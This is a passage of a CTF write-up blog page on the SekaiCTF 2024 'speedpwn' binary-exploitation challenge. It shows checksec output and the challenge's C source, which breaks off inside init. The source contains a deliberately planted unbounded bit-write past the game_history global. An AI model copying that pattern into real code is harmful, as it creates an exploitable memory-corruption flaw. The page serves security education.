<!doctype html><html lang="en"><head><title>speedpwn | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="SekaiCTF 2024. Uninitialized values. Oracle. `FILE` structure attack. GOT overwrite"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="SekaiCTF 2024. Uninitialized values. Oracle. `FILE` structure attack. GOT overwrite"><meta itemprop="keywords" content><meta itemprop="name" content="speedpwn"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="SekaiCTF 2024. Uninitialized values. Oracle. `FILE` structure attack. GOT overwrite"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="speedpwn"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/sekai-ctf/speedpwn/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="SekaiCTF 2024. Uninitialized values. Oracle. `FILE` structure attack. GOT overwrite"><meta name="twitter:description" content="SekaiCTF 2024. Uninitialized values. Oracle. `FILE` structure attack. GOT overwrite"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="speedpwn"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/sekai-ctf/speedpwn/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/sekai-ctf/speedpwn/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- SEKAICTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/sekai-ctf/speedpwn/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/sekai-ctf/speedpwn/&amp;text=speedpwn" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/sekai-ctf/speedpwn/&amp;title=speedpwn" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">speedpwn</h1><p class="mb4 f6 dib tracked">17 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a></li><li><a href="#setup-environment">Setup environment</a></li><li><a href="#debugging-with-gdb">Debugging with GDB</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#file-structure-attack"><code>FILE</code> structure attack</a></li><li><a href="#diving-into-the-file-structure-attack">Diving into the <code>FILE</code> structure attack</a></li><li><a href="#exploit-strategy">Exploit strategy</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>chall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:       amd64-64-little
RELRO:      <span class="code-dark-yellow">Partial RELRO</span>
Stack:      <span class="code-dark-green">Canary found</span>
NX:         <span class="code-dark-green">NX enabled</span>
PIE:        <span class="code-dark-red">No PIE (0x400000)</span>  
SHSTK:      <span class="code-dark-green">Enabled</span>
IBT:        <span class="code-dark-green">Enabled</span>
Stripped:   <span class="code-dark-red">No</span>
</code></pre></div><h2 id="source-code-analysis">Source code analysis</h2><p>This time, we are given the full source code in C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdlib.h&gt;</span>

<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">number_of_games</span><span class="mtk1">;</span>
<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">game_history</span><span class="mtk1">;</span>
<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">seed</span><span class="mtk1">;</span>
<span class="mtk8 mtku">FILE</span><span class="mtk1"></span><span class="mtk5">*</span> <span class="mtk1">seed_generator</span><span class="mtk1">;</span>

<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">a</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">b</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">a</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">b</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">a</span><span class="mtk1">) </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk8">__builtin_popcountll</span><span class="mtk1">(</span><span class="mtk9 mtki">b</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk8 mtku">size_t</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> (</span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">&gt;&gt;=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">print_menu</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"f) Fight bot"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"s) Simulate game"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"p) Print game history"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"r) Reseed bot"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk8">get_random_ull</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">) ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk8">rand</span><span class="mtk1">() </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">32</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> (</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk8">rand</span><span class="mtk1">();</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">fight_bot</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">bot_num</span><span class="mtk1">, </span><span class="mtk1">player_num</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">bot_num</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_random_ull</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Bot plays </span><span class="mtk6">%llu</span><span class="mtk4">!</span><span class="mtk6">\n</span><span class="mtk4">Player plays: "</span><span class="mtk1">, </span><span class="mtk1">bot_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%llu%*c</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">player_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk1">player_num</span><span class="mtk1">, </span><span class="mtk1">bot_num</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You win!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">|=</span><span class="mtk1"> ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">));</span>
<span class="mtk1">    }</span> <span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot wins!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">&amp;=</span><span class="mtk1"> (</span><span class="mtk5">~</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">)</span> <span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">number_of_games</span><span class="mtk5">++</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">simulate</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">bot_num</span><span class="mtk1">, </span><span class="mtk1">player_num</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Bot number: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%llu%*c</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">bot_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Player number: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%llu%*c</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">player_num</span><span class="mtk1">);</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Simulation result: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">cmp</span><span class="mtk1">(</span><span class="mtk1">bot_num</span><span class="mtk1">, </span><span class="mtk1">player_num</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot win!"</span><span class="mtk1">)</span> <span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"You win!"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">print_game_history</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">for</span> <span class="mtk1">(</span><span class="mtk8 mtku">size_t</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk1">number_of_games</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Game </span><span class="mtk6">%d</span><span class="mtk4">: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, (</span><span class="mtk7 mtki">int</span><span class="mtk1">)</span> <span class="mtk1">i</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">, (</span><span class="mtk5">*</span><span class="mtk1">((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">game_history</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk1">number_of_games</span><span class="mtk1"> </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk6">64</span><span class="mtk1">))) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk4">"Won"</span> <span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk4">"Lost"</span><span class="mtk1">);</span>  
<span class="mtk1">    }</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">reseed</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Bot reseeded!"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fread</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">seed</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk1">seed_generator</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">srand</span><span class="mtk1">(</span><span class="mtk1">seed</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">init</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk8">setvbuf</span><span class="mtk1">(</span><span class="mtk8">stdout</span><span class="mtk1">, </span><span class="mtk8">NULL</span><span class="mtk1">, </span><span class="mtk8">_IONBF</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
